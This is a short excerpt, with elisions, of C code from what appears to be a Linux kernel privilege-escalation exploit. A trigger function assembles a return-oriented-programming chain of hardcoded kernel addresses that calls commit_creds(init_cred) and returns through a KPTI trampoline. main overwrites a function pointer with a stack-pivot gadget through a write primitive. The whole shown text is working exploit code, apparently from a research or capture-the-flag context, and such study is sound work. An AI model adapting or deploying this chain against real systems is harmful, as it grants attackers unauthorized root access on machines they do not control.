...
void trigger()
{
    ...
    chain[idx++] = 0xffffffff8103d997; // : ret
    chain[idx++] = 0xffffffff8103d997; // : ret
    chain[idx++] = 0xffffffff8103d996; // : pop rdi ; ret
    chain[idx++] = 0xffffffff82a4c4d8; // init_cred
    chain[idx++] = 0xffffffff810b8ef0; // commit_creds
    chain[idx++] = 0xffffffff8200012a; // KPTI trampoline
...
int main()
{
	...
	func_ptr = 0xffffffff8145f614; // : add rsp, 0x80 ; pop rbx ; jmp 0xffffffff82203300
	do_write(&func_ptr);
